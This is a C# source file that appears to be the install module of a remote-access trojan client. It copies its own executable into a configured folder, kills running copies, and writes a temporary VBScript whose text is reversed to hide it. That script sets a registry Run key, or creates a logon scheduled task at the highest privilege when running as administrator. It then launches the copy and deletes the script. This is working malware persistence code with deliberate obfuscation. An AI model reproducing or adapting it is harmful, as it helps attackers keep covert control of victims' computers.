using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                string installfullpath = Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile);
                if (Process.GetCurrentProcess().MainModule.FileName != installfullpath)
                {
                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == installfullpath)
                                P.Kill();
                        }
                        catch
                        {
                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                        }
                    }

                    FileStream fs;
                    if (File.Exists(installfullpath))
                    {
                        File.Delete(installfullpath);
                        Thread.Sleep(1000);
                        fs = new FileStream(installfullpath, FileMode.Create);
                    }
                    else
                        fs = new FileStream(installfullpath, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    fs.Dispose();


                    string tempName = Path.GetTempFileName() + ".vbs";
                    string TempPath = Strings.StrReverse(installfullpath);
                    string TempPathName = Strings.StrReverse(Path.GetFileName(installfullpath));
                    using (StreamWriter sw = new StreamWriter(tempName, false))
                    {
                        if (!Methods.IsAdmin())
                        {
                            sw.Write(Strings.StrReverse($@"""ZS_GER"",""{TempPath}"",""{TempPathName}\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"" etirWgeR.llehShsW
)""llehS.tpircSW""(tcejbOetaerC = llehShsW teS"));

                        }
                        else
                        {
                            sw.Write(Strings.StrReverse($@")eslaF ,0 ,""{TempPath}"""" rt/ {TempPathName} nt/ tsehgih lr/ nogolno cs/ etaerc/ sksathcs""( nuR.llehShsw = ter
                                )""llehS.tpircSW""(tcejbOetaerC = llehShsw teS"));
                        }
                    }
                    Process.Start(tempName);
                    Thread.Sleep(1000);
                    File.Delete(tempName);
                    Process.Start(installfullpath);
                    Methods.ClientExit();
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
